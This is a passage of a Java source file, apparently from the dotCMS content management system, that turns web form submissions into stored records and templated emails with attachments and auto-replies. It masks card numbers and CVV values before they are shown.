address\n\t * subject:\t\t\t\tSubject of the email\n\t * cc:\t\t\t\t\tCarbon copy of the email\n\t * bcc:\t\t\t\t\tHidden carbon copy of the email\n\t * html:\t\t\t\tSet it to false|0|f if you don't want to send an html kind of email\n\t * dispatch:\t\t\tNot used reserved for struts processing\n\t * order:\t\t\t\tOrder how you want to present the parameters, the valid syntax of this \n\t * \t\t\t\t\t\tparameter is like: param1,param2,...\n\t * prettyOrder:\t\t\tThis property goes together with the order property to specify \n\t * \t\t\t\t\t\tprettiest names to the parameters, these prettiest names are used\n\t * \t\t\t\t\t\twhen building the simple html table e-mail  \n\t * ignore:\t\t\t\tParameters you want to exclude from the email sent, the valid syntax of this \n\t * \t\t\t\t\t\tparameter is like ;param1;param2;..., this is only used when building the \n\t * \t\t\t\t\t\tsimple html table email body and not when building the email from a given template\n\t * emailTemplate: \t\tThe path to the email template to be used to generate the email\n\t * \t\t\t\t\t\tit can be a path in the dotCMS tree or a real path in the server file system\n\t * \t\t\t\t\t\tunder /liferay folder, dotCMS paths take precedence over filesystem paths\n\t * attachFiles: \t\tA comma separated list of the file kind of fields you want the method include as\n\t * \t\t\t\t\t    attachments to the email to send\n\t * If the following parameters are included an auto reply message will be send\n\t * to the from email  \n\t * autoReplyFrom:     Address to be used as the from \n\t * autoReplySubject:  Subject of the message\n\t * autoReplyText: \t  Message to send\n\t * autoReplyTemplate: A path to an html template that can be used to generate this message\n\t * \t\t\t\t\t  it can be a path in the dotCMS tree or a real path in the server file system\n\t * \t\t\t\t\t  under /liferay folder\n\t *\n\t * @param parameters A map of the submitted fields, any kind of parameter can \n\t * be used and will be passed to the email template to render the email body text used when\n\t * sending the email but only string or file kind parameters will be used to generate the database\n\t * reports and generate plain table html table like body text when no html template is passed \n\t * in the parameters\n\t *   \n\t * @param spamValidation List of fields that wants to be checked for possible spam\n\t * @param otherIgnoredParams A list of other fields (more than the default ones) that you want to\n\t * \t\t\t\t\t\t\t be excluded from the list of fields to be sent in the email \n\t * @param host Current dotCMS host used to submit the form\n\t * @param user User how submits the form (can be null then the user parameters won't be excluded\n\t * \t\t\t\ton the template substitution)\n\t * @return The saved webform if a formType/formName parameter is specified if not returns null.\n\t * @throws \tDotRuntimeException when spam is detected or any other mayor error occurs\n\t * \t \t\tCreditCardDeniedException when the credit card gets denied\n\t */\n\tpublic static WebForm sendParameterizedEmail(Map<String,Object> parameters, Set<String> spamValidation, \n\t\t\tHost host, User user) throws  DotRuntimeException\n\t\t\t{\n\n\t\t// check for possible spam\n\t\tif(spamValidation != null)\n\t\t\tif (FormSpamFilter.isSpamRequest(parameters, spamValidation)) {\n\t\t\t\tthrow new DotRuntimeException(\"Spam detected\");\n\t\t\t}\n\n\t\t//Variables initialization\n\n\t\t//Default parameters to be ignored when sending the email\n\t\tString ignoreString = \":formType:formName:to:from:subject:cc:bcc:html:dispatch:order:\" +\n\t\t\"prettyOrder:autoReplyTo:autoReplyFrom:autoReplyText:autoReplySubject:\" +\n\t\t\"ignore:emailTemplate:autoReplyTemplate:autoReplyHtml:chargeCreditCard:attachFiles:\";\n\t\tif(UtilMethods.isSet(getMapValue(\"ignore\", parameters))) {\n\t\t\tignoreString += getMapValue(\"ignore\", parameters).toString().replace(\",\", \":\") + \":\";\n\t\t}\n\n\t\t// Sort the forms' fields by the given order parameter\n\t\tString order = (String)getMapValue(\"order\", parameters);\n\t\tMap<String, Object> orderedMap = new LinkedHashMap<String, Object>();\n\n\t\t// Parameter prettyOrder is used to map\n\t\t// the pretty names of the variables used in the order field\n\t\t// E.G: order = firstName, lastName\n\t\t//\t\tprettyOrder = First Name, Last Name\n\t\tString prettyOrder = (String)getMapValue(\"prettyOrder\", parameters);\n\t\tMap<String, String> prettyVariableNamesMap = new LinkedHashMap<String, String>();\n\n\t\t// Parameter attachFiles is used to specify the file kind of fields you want to attach\n\t\t// to the mail is sent by this method\n\t\t// E.G: attachFiles = file1, file2, ...\n\t\tString attachFiles = (String)getMapValue(\"attachFiles\", parameters);\n\n\t\t//Building the parameters maps from the order and pretty order parameters\n\t\tif (order != null) {\n\t\t\tString[] orderArr = order.split(\"[;,]\");\n\t\t\tString[] prettyOrderArr = prettyOrder!=null?prettyOrder.split(\"[;,]\"):new String[0];\n\n\t\t\tfor (int i = 0; i < orderArr.length; i++) {\n\t\t\t\tString orderParam = orderArr[i].trim();\n\t\t\t\tObject value = (getMapValue(orderParam, parameters) == null) ? \n\t\t\t\t\t\tnull : getMapValue(orderParam, parameters);\n\n\t\t\t\tif(value != null) {\n\t\t\t\t\t//if pretty name is passed using it as a key value in the ordered map\n\t\t\t\t\tif (prettyOrderArr.length > i) \n\t\t\t\t\t\tprettyVariableNamesMap.put(orderArr[i].trim(), prettyOrderArr[i].trim());\n\t\t\t\t\telse\n\t\t\t\t\t\tprettyVariableNamesMap.put(orderArr[i].trim(), orderArr[i].trim());\n\t\t\t\t\torderedMap.put(orderArr[i].trim(), value);\n\t\t\t\t}\n\t\t\t}\n\n\t\t}\n\n\t\tfor (Entry<String, Object> param : parameters.entrySet()) {\n\t\t\tif(!orderedMap.containsKey(param.getKey())) {\n\t\t\t\torderedMap.put(param.getKey(), param.getValue());\n\t\t\t\tprettyVariableNamesMap.put(param.getKey(), param.getKey());\n\t\t\t}\n\t\t}\n\n\t\tStringBuffer filesLinks = new StringBuffer();\n\n\t\t// Saving the form in the database and the submitted file to the dotCMS\n\t\tString formType = getMapValue(\"formType\", parameters) != null?\n\t\t\t\t(String)getMapValue(\"formType\", parameters):(String)getMapValue(\"formName\", parameters);\n\n\t\t\t\tWebForm formBean = saveFormBean(parameters, host, formType, ignoreString, filesLinks);\n\n\n\t\t\t\t// Setting up the email\n\t\t\t\t// Email variables - decrypting crypted email addresses \n\n\t\t\t\tString from = UtilMethods.replace((String)getMapValue(\"from\", parameters), \"spamx\", \"\");\n\t\t\t\tString to = UtilMethods.replace((String)getMapValue(\"to\", parameters), \"spamx\", \"\");\n\t\t\t\tString cc = UtilMethods.replace((String)getMapValue(\"cc\", parameters), \"spamx\", \"\");\n\t\t\t\tString bcc = UtilMethods.replace((String)getMapValue(\"bcc\", parameters), \"spamx\", \"\");\n\t\t\t\tString fromName = UtilMethods.replace((String)getMapValue(\"fromName\", parameters), \"spamx\", \"\");\n\t\t\t\ttry { from = PublicEncryptionFactory.decryptString(from); } catch (Exception e) { }\n\t\t\t\ttry { to = PublicEncryptionFactory.decryptString(to); } catch (Exception e) { }\n\t\t\t\ttry { cc = PublicEncryptionFactory.decryptString(cc); } catch (Exception e) { }\n\t\t\t\ttry { bcc = PublicEncryptionFactory.decryptString(bcc); } catch (Exception e) { }\n\t\t\t\ttry { fromName = PublicEncryptionFactory.decryptString(fromName); } catch (Exception e) { }\n\n\t\t\t\tString subject = (String)getMapValue(\"subject\", parameters);\n\t\t\t\tsubject = (subject == null) ? \"Mail from \" + host.getHostname() + \"\" : subject;\n\n\t\t\t\t\n\t\t\t\t// strip line breaks from headers\n\t\t\t\tfrom = from.replaceAll(\"\\\\s\", \" \");\n\t\t\t\tto = to.replaceAll(\"\\\\s\", \" \");\n\t\t\t\tcc = cc.replaceAll(\"\\\\s\", \" \");\n\t\t\t\tbcc = bcc.replaceAll(\"\\\\s\", \" \");\n\t\t\t\tfromName = fromName.replaceAll(\"\\\\s\", \" \");\n\t\t\t\tsubject = subject.replaceAll(\"\\\\s\", \" \");\n\t\t\t\t\n\t\t\t\t\n\t\t\t\t\n\t\t\t\t\n\t\t\t\t\n\t\t\t\t\n\t\t\t\t\n\t\t\t\t\n\t\t\t\t\n\t\t\t\tString emailFolder = (String)getMapValue(\"emailFolder\", parameters);\n\n\t\t\t\tboolean html = getMapValue(\"html\", parameters) != null?Parameter.getBooleanFromString((String)getMapValue(\"html\", parameters)):true;\n\n\t\t\t\tString templatePath = (String) getMapValue(\"emailTemplate\", parameters);\n\n\t\t\t\t// Building email message no template\n\t\t\t\tMap<String, String> emailBodies = null;\n\n\t\t\t\ttry {\n\t\t\t\t\temailBodies = buildEmail(templatePath, host, orderedMap, prettyVariableNamesMap, filesLinks.toString(), ignoreString, user);\n\t\t\t\t} catch (Exception e) {\n\t\t\t\t\tLogger.error(EmailFactory.class, \"sendForm: Couldn't build the email body text.\", e);\n\t\t\t\t\tthrow new DotRuntimeException(\"sendForm: Couldn't build the email body text.\", e);\n\t\t\t\t}\n\n\t\t\t\t// Saving email backup in a file\n\t\t\t\ttry {\n\t\t\t\t\tString filePath = FileUtil.getRealPath(Config.getStringProperty(\"EMAIL_BACKUPS\"));\n\t\t\t\t\tnew File(filePath).mkdir();\n\n\t\t\t\t\tFile file = null;\n\t\t\t\t\tsynchronized (emailTime) {\n\t\t\t\t\t\temailTime = new Long(emailTime.longValue() + 1);\n\t\t\t\t\t\tif (UtilMethods.isSet(emailFolder)) {\n\t\t\t\t\t\t\tnew File(filePath + File.separator + emailFolder).mkdir();\n\t\t\t\t\t\t\tfilePath = filePath + File.separator + emailFolder;\n\t\t\t\t\t\t}\n\t\t\t\t\t\tfile = new File(filePath + File.separator + emailTime.toString()\n\t\t\t\t\t\t\t\t+ \".html\");\n\t\t\t\t\t}\n\t\t\t\t\tif (file != null) {\n\t\t\t\t\t\tjava.io.OutputStream os = new java.io.FileOutputStream(file);\n\t\t\t\t\t\tBufferedOutputStream bos = new BufferedOutputStream(os);\n\t\t\t\t\t\tif(emailBodies.get(\"emailHTMLBody\") != null)\n\t\t\t\t\t\t\tbos.write(emailBodies.get(\"emailHTMLBody\").getBytes());\n\t\t\t\t\t\telse if(emailBodies.get(\"emailHTMLTableBody\") != null) \n\t\t\t\t\t\t\tbos.write(emailBodies.get(\"emailHTMLTableBody\").getBytes());\n\t\t\t\t\t\telse\n\t\t\t\t\t\t\tbos.write(emailBodies.get(\"emailPlainTextBody\").getBytes());\n\t\t\t\t\t\tbos.flush();\n\t\t\t\t\t\tbos.close();\n\t\t\t\t\t\tos.close();\n\t\t\t\t\t}\n\t\t\t\t} catch (Exception e) {\n\t\t\t\t\tLogger.warn(EmailFactory.class, \"sendForm: Couldn't save the email backup in \" + Config.getStringProperty(\"EMAIL_BACKUPS\"));\n\t\t\t\t}\n\n\t\t\t\t// send the mail out;\n\t\t\t\tMailer m = new Mailer();\n\t\t\t\tm.setToEmail(to);\n\t\t\t\tm.setFromEmail(from);\n\t\t\t\tm.setFromName(fromName);\n\t\t\t\tm.setCc(cc);\n\t\t\t\tm.setBcc(bcc);\n\t\t\t\tm.setSubject(subject);\n\n\t\t\t\tif (html) {\n\t\t\t\t\tif(UtilMethods.isSet(emailBodies.get(\"emailHTMLBody\")))\n\t\t\t\t\t\tm.setHTMLBody(emailBodies.get(\"emailHTMLBody\"));\n\t\t\t\t\telse\n\t\t\t\t\t\tm.setHTMLBody(emailBodies.get(\"emailHTMLTableBody\"));\n\t\t\t\t}\n\t\t\t\tm.setTextBody(emailBodies.get(\"emailPlainTextBody\"));\n\n\t\t\t\t//Attaching files requested to be attached to the email\n\t\t\t\tif(attachFiles != null) {\n\t\t\t\t\tattachFiles = \",\" + attachFiles.replaceAll(\"\\\\s\", \"\") + \",\";\n\t\t\t\t\tfor(Entry<String, Object> entry : parameters.entrySet()) {\n\t\t\t\t\t\tif(entry.getValue() instanceof File && attachFiles.indexOf(\",\" + entry.getKey() + \",\") > -1) {\n\t\t\t\t\t\t\tFile f = (File)entry.getValue();\n\t\t\t\t\t\t\tm.addAttachment(f, entry.getKey() + \".\" + UtilMethods.getFileExtension(f.getName()));\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\tif (m.sendMessage()) {\n\n\t\t\t\t\t// there is an auto reply, send it on\n\t\t\t\t\tif ((UtilMethods.isSet((String)getMapValue(\"autoReplyTemplate\", parameters)) ||\n\t\t\t\t\t\t\tUtilMethods.isSet((String)getMapValue(\"autoReplyText\", parameters)))\n\t\t\t\t\t\t\t&& UtilMethods.isSet((String)getMapValue(\"autoReplySubject\", parameters))\n\t\t\t\t\t\t\t&& UtilMethods.isSet((String)getMapValue(\"autoReplyFrom\", parameters))) {\n\n\t\t\t\t\t\ttemplatePath = (String) getMapValue(\"autoReplyTemplate\", parameters);\n\n\t\t\t\t\t\tif(UtilMethods.isSet(templatePath)) {\n\t\t\t\t\t\t\ttry {\n\t\t\t\t\t\t\t\temailBodies = buildEmail(templatePath, host, orderedMap, prettyVariableNamesMap, filesLinks.toString(), ignoreString, user);\n\t\t\t\t\t\t\t} catch (Exception e) {\n\t\t\t\t\t\t\t\tLogger.error(EmailFactory.class, \"sendForm: Couldn't build the auto reply email body text. Sending plain text.\", e);\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\n\t\t\t\t\t\tm = new Mailer();\n\t\t\t\t\t\tString autoReplyTo = (String)(getMapValue(\"autoReplyTo\", parameters) == null?getMapValue(\"from\", parameters):getMapValue(\"autoReplyTo\", parameters));\n\t\t\t\t\t\tm.setToEmail(UtilMethods.replace(autoReplyTo, \"spamx\", \"\"));\n\t\t\t\t\t\tm.setFromEmail(UtilMethods.replace((String)getMapValue(\"autoReplyFrom\", parameters), \"spamx\", \"\"));\n\t\t\t\t\t\tm.setSubject((String)getMapValue(\"autoReplySubject\", parameters));\n\n\t\t\t\t\t\tString autoReplyText = (String)getMapValue(\"autoReplyText\", parameters); \n\t\t\t\t\t\tboolean autoReplyHtml = getMapValue(\"autoReplyHtml\", parameters) != null?Parameter.getBooleanFromString((String)getMapValue(\"autoReplyHtml\", parameters)):html;\n\t\t\t\t\t\tif (autoReplyText != null)\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tif(autoReplyHtml)\n\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\tm.setHTMLBody((String)getMapValue(\"autoReplyText\", parameters));\n\t\t\t\t\t\t\t} else {\n\t\t\t\t\t\t\t\tm.setTextBody((String)getMapValue(\"autoReplyText\", parameters));\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t\telse\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tif (autoReplyHtml) \n\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\tif(UtilMethods.isSet(emailBodies.get(\"emailHTMLBody\")))\n\t\t\t\t\t\t\t\t\tm.setHTMLBody(emailBodies.get(\"emailHTMLBody\"));\n\t\t\t\t\t\t\t\telse\n\t\t\t\t\t\t\t\t\tm.setHTMLBody(emailBodies.get(\"emailHTMLTableBody\"));\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tm.setTextBody(emailBodies.get(\"emailPlainTextBody\"));\n\t\t\t\t\t\t}\n\t\t\t\t\t\tm.sendMessage();\n\t\t\t\t\t}\n\t\t\t\t} else {\n\t\t\t\t\tif(formBean != null){\n\t\t\t\t\t\ttry {\n\t\t\t\t\t\t\tHibernateUtil.delete(formBean);\n\t\t\t\t\t\t} catch (DotHibernateException e) {\t\t\t\t\t\t\t\n\t\t\t\t\t\t\tLogger.error(EmailFactory.class, e.getMessage(), e);\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\tthrow new DotRuntimeException(\"Unable to send the email\");\n\t\t\t\t}\n\n\t\t\t\treturn formBean;\n\n\t\t\t}\n\n\tpublic static Map<String, String> buildEmail(String templatePath, Host host, Map<String,Object> parameters, \n\t\t\tMap<String, String> prettyParametersNamesMap, String filesLinks, String ignoreString, User user) \n\t\t\tthrows WebAssetException, ResourceNotFoundException, ParseErrorException, MethodInvocationException, IOException, DotDataException, DotSecurityException, PortalException, SystemException\n\t\t\t{\n\t\tStringBuffer emailHTMLBody = new StringBuffer();\n\t\tStringBuffer emailHTMLTableBody = new StringBuffer();\n\t\tStringBuffer emailPlainTextBody = new StringBuffer();\n\n\t\t//Case when a html page template is passed as parameter\n\t\tif(UtilMethods.isSet(templatePath))\n\t\t{\n\t\t\tIdentifier id = APILocator.getIdentifierAPI().find(host,templatePath);\n\t\t\tString idInode = id.getInode();\n\t\t\t\n\t\t\tString languageId = Long.toString((APILocator.getLanguageAPI().getDefaultLanguage().getId()));\n\t\t\t\n\t\t\ttry {\n\t\t\t\tif(UtilMethods.isSet(parameters.get(\"languageId\"))) {\n\t\t\t\t\tlanguageId = (String) parameters.get(\"languageId\");\n\t\t\t\t}\n\t\t\t} catch(ClassCastException e) {\n\t\t\t\tLogger.info(EmailFactory.class, \"Error parsing languageId\");\n\t\t\t}\n\t\t\t\n\t\t\tString languageStr = \"_\" + languageId;\n\n\t\t\tTemplate t = null;\n\n\t\t\ttry {\n\t\t\t\tif(InodeUtils.isSet(idInode)) {\n\t\t\t\t\tt = UtilMethods.getVelocityTemplate(\"live/\"+ idInode + languageStr + \".\"+ Config.getStringProperty(\"VELOCITY_HTMLPAGE_EXTENSION\")); \n\t\t\t\t} else {\n\t\t\t\t\tt = UtilMethods.getVelocityTemplate(templatePath); \n\t\t\t\t}\n\t\t\t} catch (Exception e) {\n\t\t\t}\n\n\t\t\tif (t != null) {\n\n\t\t\t\tHttpServletRequest request = (HttpServletRequest) parameters.get(\"request\"); \n\t\t\t\tHttpServletResponse response = (HttpServletResponse) parameters.get(\"response\");\n\t\t\t\tContext context = null;\n\t\t\t\tif(InodeUtils.isSet(idInode) && request != null && response != null)\n\t\t\t\t{\n\t\t\t\t\tcontext = VelocityUtil.getWebContext(request,response);\n\t\t\t\t}\n\t\t\t\telse\n\t\t\t\t{\n\t\t\t\t\tcontext = VelocityUtil.getBasicContext();\n\t\t\t\t}\n\n\n\t\t\t\t//Copying the parameters to the context \n\t\t\t\tfor(Entry<String, Object> entry : parameters.entrySet()) {\n\t\t\t\t\tObject value = getMapValue(entry.getKey(), parameters);\n\t\t\t\t\tif(entry.getKey().equals(\"ccNumber\") && value instanceof String) {\n\t\t\t\t\t\tvalue = (String)UtilMethods.obfuscateCreditCard((String)value);\n\t\t\t\t\t}\n\t\t\t\t\tif(entry.getKey().contains(\"cvv\") && value instanceof String) {\n\t\t\t\t\t\tString valueString = (String)value;\n\t\t\t\t\t\tif(valueString.length() > 3){\n\t\t\t\t\t\t\tvalue = (String)UtilMethods.obfuscateString(valueString,2);\n\t\t\t\t\t\t}\n\t\t\t\t\t\telse {\n\t\t\t\t\t\t\tvalue = (String)UtilMethods.obfuscateString(valueString,1);\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\tcontext.put(entry.getKey(), value);\n\t\t\t\t}\n\t\t\t\tcontext.put(\"utilMethods\", new UtilMethods());\n\t\t\t\tcontext.put(\"UtilMethods\", new UtilMethods());\n\t\t\t\tcontext.put(\"host\", host);\n\t\t\t\tif(user != null)\n\t\t\t\t\tcontext.put(\"user\", user);\n\n\t\t\t\tStringWriter writer = new StringWriter();\n\n\t\t\t\t//Rendering the html template with the parameters\n\t\t\t\tt.merge(context, writer);\n\t\t\t\tString textVar = writer.toString();\n\t\t\t\temailHTMLBody = new StringBuffer(alterBodyHtmlAbsolutizePaths(replaceTextVar(textVar, parameters, user), host.getHostname()));\n\t\t\t}\n\t\t}\n\n\t\tString subject = (String)getMapValue(\"subject\", parameters);\n\t\tsubject = (subject == null) ? \"Mail from \" + host.getHostname(): subject;\n\n\t\temailHTMLTableBody.append(\"<html><style>td{font-family:arial;font-size:10pt;}</style><BODY>\");\n\t\temailHTMLTableBody.append(\"<TABLE bgcolor=eeeeee width=95%>\");\n\t\temailHTMLTableBody.append(\"<TR><TD colspan=2><strong>Information from \"\n\t\t\t\t+ host.getHostname() + \": \" + subject\n\t\t\t\t+ \"</strong></TD></TR>\");\n\t\temailPlainTextBody.append(\"Information from \" + host.getHostname()\n\t\t\t\t+ \": \\t\" + subject + \"\\n\\n\");\n\n\t\t// Loop over the request Map or the ordered Map\n\t\tIterator<Entry<String,Object>> it = parameters.entrySet().iterator();\n\n\t\twhile (it.hasNext()) {\n\n\t\t\tEntry<String, Object> e = (Entry<String, Object>) it.next();\n\t\t\tString key = e.getKey();\n\t\t\tObject mapvalue = getMapValue(key, parameters);\n\t\t\tif (mapvalue instanceof String) {\n\t\t\t\tString value = (String)mapvalue;\n\t\t\t\tif(key.equals(\"ccNumber\") && value instanceof String) {\n\t\t\t\t\tvalue = (String)UtilMethods.obfuscateCreditCard((String)value);\n\t\t\t\t}\n\t\t\t\tif(key.contains(\"cvv\") && value instanceof String) {\n\t\t\t\t\tString valueString = (String)value;\n\t\t\t\t\tif(valueString.length() > 3){\n\t\t\t\t\t\tvalue = (String)UtilMethods.obfuscateString(valueString,2);\n\t\t\t\t\t}\n\t\t\t\t\telse {\n\t\t\t\t\t\tvalue = (String)UtilMethods.obfuscateString(valueString,1);\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\tif (ignoreString.indexOf(\":\" + key + \":\") < 0 && UtilMethods.isSet(value)) {\n\t\t\t\t\tString prettyKey = prettyParametersNamesMap.get(key);\n\t\t\t\t\tString capKey = prettyKey != null?prettyKey:UtilMethods.capitalize(key);\n\t\t\t\t\temailHTMLTableBody.append(\"<TR><TD bgcolor=white valign=top nowrap>&nbsp;\" + capKey + \"&nbsp;</TD>\");\n\t\t\t\t\temailHTMLTableBody.append(\"<TD bgcolor=white valign=top width=100%>\" + value + \"</TD></TR>\");\n\t\t\t\t\temailPlainTextBody.append(capKey + \":\\t\" + value + \"\\n\");\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\n\t\tif (UtilMethods.isSet(filesLinks)) {\n\t\t\temailHTMLTableBody.append(\"<TR><TD bgcolor=white valign=top nowrap>&nbsp;Files&nbsp;</TD>\");\n\t\t\temailHTMLTableBody.append(\"<TD bgcolor=white valign=top width=100%>\" + filesLinks + \"</TD></TR>\");\n\t\t\temailPlainTextBody.append(\"Files:\\t\" + filesLinks + \"\\n\");\n\t\t}\n\n\t\temailHTMLTableBody.append(\"</TABLE></BODY></HTML>\");\n\n\t\tMap<String, String> returnMap = new HashMap<String, String>();\n\t\tif(UtilMethods.isSet(emailHTMLBody.toString()))\n\t\t\treturnMap.put(\"emailHTMLBody\", emailHTMLBody.toString());\n\t\tif(UtilMethods.isSet(emailHTMLTableBody.toString()))\n\t\t\treturnMap.put(\"emailHTMLTableBody\", emailHTMLTableBody.toString());\n\t\treturnMap.put(\"emailPlainTextBody\", emailPlainTextBody.toString());\n\n\t\treturn returnMap;\n\t\t\t}\n\n\tprivate static WebForm saveFormBean (Map<String, Object> parameters, Host host, String formType, String ignoreString, StringBuffer filesLinks) {\n\n\t\t//Fields predefined for the form reports\n\t\tString predefinedFields = \":prefix:title:firstName:middleInitial:middleName:lastName:fullName:organization:address:address1:address2:city:state:zip:country:phone:email:\";\n\n\t\t//Return variable\n\t\tWebForm formBean = new WebForm();\n\t\tformBean.setFormType(formType);\n\n\t\t// Copy the common fields set in the form\n\t\ttry {\n\t\t\tfor (Entry<String, Object> param : parameters.entrySet()) {\n\t\t\t\tBeanUtils.setProperty(formBean, param.getKey(), getMapValue(param.getKey(), parameters));\n\t\t\t}\n\t\t} catch (Exception e1) {\n\t\t\tLogger.error(EmailFactory.class, \"sendForm: Error ocurred trying to copy the form bean parameters\", e1);\n\t\t}\n\n\t\ttry {\n\t\t\tHibernateUtil.save(formBean);\n\t\t} catch (DotHibernateException e) {\n\t\t\tLogger.error(EmailFactory.class, e.getMessage(), e);\n\t\t}\t\t\n\t\tString formId = formBean.getWebFormId();\n\n\t\t// Loop over the request Map or the ordered Map to set the custom\n\t\t// fields and also saving the submitted files\n\t\tStringBuffer customFields = new StringBuffer();\n\n\t\tSet<Entry<String, Object>> paramSet = parameters.entrySet();\n\n\t\tfor (Entry<String, Object> param : paramSet) {\n\n\t\t\tString key = (String) param.getKey();\n\n\n\t\t\tString value = null;\n\n\t\t\tObject paramValue = getMapValue(key, parameters);\n\t\t\tif (paramValue instanceof File) {\n\n\t\t\t\tFile f = (File) param.getValue();\n\t\t\t\tString submittedFileName = f.getName();\n\t\t\t\tString fileName = key + \".\" + UtilMethods.getFileExtension(submittedFileName);\n\t\t\t\tif(getMapValue(fileName.substring(4, key.length()) + \"FName\", parameters) != null) {\n\t\t\t\t\tfileName = getMapValue(fileName.substring(4, key.length()) + \"FName\", parameters) + \n\t\t\t\t\t\t\".\" + UtilMethods.getFileExtension(submittedFileName);\n\t\t\t\t}\n\n\t\t\t\t//Saving the file\n\t\t\t\ttry {\n\t\t\t\t\tif(f.exists()) {\n\t\t\t\t\t\tString filesFolder = getMapValue(\"formFolder\", parameters) instanceof String?(String)getMapValue(\"formFolder\", parameters):null;\n\t\t\t\t\t\t\n\t\t\t\t\t\tString fileLink = saveFormFile(formId, formType, fileName, f, host, filesFolder);\n\t\t\t\t\t\tfilesLinks.append(filesLinks.toString().equals(\"\")? \"http://\" + host.getHostname() + fileLink : \",http://\" + host.getHostname() + fileLink);\n\t\t\t\t\t}\n\t\t\t\t} catch (Exception e) {\n\t\t\t\t\tLogger.error(EmailFactory.class, \"sendForm: couldn't saved the submitted file into the cms = \" + fileName, e);\t\t\t\t\t\n\t\t\t\t\ttry {\n\t\t\t\t\t\tHibernateUtil.delete(formBean);\n\t\t\t\t\t} catch (DotHibernateException e1) {\n\t\t\t\t\t\tLogger.error(EmailFactory.class, e1.getMessage(), e1);\t\t\t\t\t\t\n\t\t\t\t\t}\n\t\t\t\t\tthrow new DotRuntimeException(\"sendForm: couldn't saved the submitted file into the cms = \" + fileName, e);\n\t\t\t\t}\n\n\t\t\t} else if (paramValue instanceof String)\n\t\t\t\tvalue = (String)paramValue;\n\n\t\t\tList<String> cFields = new ArrayList<String>();\n\t\t\tif (predefinedFields.indexOf(\":\" + key + \":\") < 0\n\t\t\t\t\t&& ignoreString.indexOf(\":\" + key + \":\") < 0\n\t\t\t\t\t&& UtilMethods.isSet(value)) {\n\t\t\t\tvalue = value.replaceAll(\"\\\\|\", \" \").replaceAll(\"=\", \" \");\n\t\t\t\tif(key.equals(\"ccNumber\"))\n\t\t\t\t\tvalue = UtilMethods.obfuscateCreditCard(value);\n\n\t\t\t\tString capKey = UtilMethods.capitalize(key);\n\t\t\t\tint aux = 2;\n\t\t\t\tString capKeyAux = capKey;\n\t\t\t\twhile (cFields.contains(capKeyAux)) {\n\t\t\t\t\tcapKeyAux = capKey + aux;\n\t\t\t\t\t++aux;\n\t\t\t\t}\n\t\t\t\tcFields.add(capKeyAux);\n\t\t\t\tString cField = capKeyAux + \"=\" + value;\n\t\t\t\tcustomFields.append(cField + \"|\");\n\t\t\t}\n\t\t}\n\n\t\tcustomFields.append(\"Files=\" + filesLinks);\n\n\t\t//Setting the custom fields and saving them\n\t\tformBean.setCustomFields(customFields.toString());\n\t\tformBean.setSubmitDate(new Date());\n\n\t\tif(UtilMethods.isSet(formType)){\n\t\t\ttry {\n\t\t\t\tHibernateUtil.saveOrUpdate(formBean);\n\t\t\t} catch (DotHibernateException e) {\n\t\t\t\tthrow new DotRuntimeException(\"Webform Save Failed\");\n\t\t\t}\n\t\t}\n\t\telse{\n\t\t\tLogger.debug(EmailFactory.class, \"The web form doesn't have the required formType field, the form data will not be saved in the database.\");\n\t\t}\n\n\n\t\treturn formBean;\n\t}\n\n\t\n\n\tprivate static String getFormFileFolderPath (String formType, String formInode) {\n\t\tString path = Config.getStringProperty(\"SAVED_UPLOAD_FILES_PATH\")\n\t\t+ \"/\" + formType.replace(\" \", \"_\") + \"/\"\n\t\t+ String.valueOf(formInode).substring(0, 1) + \"/\" + formInode;\n\t\treturn path;\n\t}\n\n\tprivate static String saveFormFile (String formInode, String formType, \n\t\t\tString fileName, File fileToSave, Host currentHost, String filesFolder) throws Exception {\n\t\tFileAPI fileAPI=APILocator.getFileAPI();\n\t\tString path;\n\t\tif(filesFolder != null)\n\t\t\tpath = filesFolder;\n\t\telse\n\t\t\tpath = getFormFileFolderPath(formType, formInode);\n\t\tFolder folder = APILocator.getFolderAPI().createFolders(path, currentHost, APILocator.getUserAPI().getSystemUser(), false);\n\t\tString baseFilename = fileName;\n\t\tint c = 1;\n\t\twhile(fileAPI.fileNameExists(folder, fileName)) {\n\t\t\tfileName = UtilMethods.getFileName(baseFilename) + \"-\" + c + \".\" + UtilMethods.getFileExtension(baseFilename);\n\t\t\tc++;\n\t\t}\n\t\tHost host = APILocator.getHostAPI().find(folder.getHostId(), APILocator.getUserAPI().getSystemUser(), false);\n\t\twhile(APILocator.getFileAssetAPI().fileNameExists(host,folder, fileName, \"\")) {\n\t\t\tfileName = UtilMethods.getFileName(baseFilename) + \"-\" + c + \".\" + UtilMethods.getFileExtension(baseFilename);\n\t\t\tc++;\n\t\t}\n\t\t\n\t\tContentlet cont = new Contentlet();\n\t\tcont.setStructureInode(folder.getDefaultFileType());\n\t\tcont.setStringProperty(FileAssetAPI.TITLE_FIELD, UtilMethods.getFileName(fileName));\n\t\tcont.setFolder(folder.getInode());\n\t\tcont.setHost(host.getIdentifier());\n\t\tcont.setBinary(FileAssetAPI.BINARY_FIELD, fileToSave);\n\t\tAPILocator.getContentletAPI().checkin(cont, APILocator.getUserAPI().getSystemUser(),false);\n\n\t\treturn path + \"/\" + fileName;\n\t}\n\n\tprivate static String replaceTextVar(String template, Map<String, Object> parameters, User user) \n\t{\n\t\tString finalMessageStr = template;\n\n\t\tSet<String> keys = parameters.keySet();\n\t\tfor(String key : keys)\n\t\t{\n\t\t\tif(getMapValue(key, parameters) instanceof String) {\n\t\t\t\tString value = (String)getMapValue(key, parameters);\n\t\t\t\tvalue = (value != null ? value : \"\");\n\t\t\t\tfinalMessageStr = finalMessageStr.replaceAll(\"(?i)(<|(&lt;))/\"+ key +\"(>|(&gt;))\", \"\");\n\t\t\t\tfinalMessageStr = finalMessageStr.replaceAll(\"(?i)(<|(&lt;))\" + key + \"(\\\")?( )*/*( 